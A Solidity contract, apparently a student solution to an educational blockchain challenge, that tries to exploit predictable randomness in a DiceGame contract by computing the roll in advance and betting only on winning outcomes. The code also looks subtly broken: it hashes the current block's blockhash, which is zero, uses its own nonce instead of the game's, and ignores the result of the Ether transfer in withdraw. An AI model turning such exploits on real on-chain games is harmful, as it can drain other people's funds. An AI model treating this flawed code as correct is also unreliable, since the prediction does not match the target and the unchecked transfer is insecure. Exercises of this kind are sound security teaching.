pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    uint256 public nonce = 0;
    uint256 public prize = 0;
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the withdraw function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable _addr, uint256 _amount)external onlyOwner {
        _addr.call{value: _amount}("");
    }
    // Create the riggedRoll() function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external {
        require(address(this).balance >= .002 ether, "no enough eth, at least 0.002 eth");
        
    
            bytes32 myHash = blockhash(block.number);
            bytes32 hash = keccak256(abi.encodePacked(myHash, address(this), nonce));
            uint256 roll = uint256(hash) % 16;
            console.log("\t", "   Dice Game RiggedRoll:", roll);
            if(roll >= 0 && roll <= 5){
                diceGame.rollTheDice{value:.002 ether}();
            }
        return;
    }
    // Include the receive() function to enable the contract to receive incoming Ether.
    receive() external payable {}
}